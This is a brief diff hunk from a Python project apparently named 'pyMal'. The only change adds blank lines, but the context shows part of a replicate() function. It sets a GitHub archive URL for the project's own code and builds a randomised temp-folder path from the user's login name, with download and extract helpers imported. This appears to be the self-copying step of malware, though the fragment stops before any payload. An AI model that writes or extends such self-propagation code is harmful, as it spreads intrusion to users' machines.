@@ -4,6 +4,8 @@ from Utils.helpers import random_string, download_file,extract_zip,tempFolder,Ba
 
 
 
+
+
 def replicate():
     our_zip = "https://github.com/Cyb3rDud3/pyMal/archive/refs/heads/main.zip"
     path = tempFolder.format(os.getlogin(),random_string(is_random=True,is_zip=True))
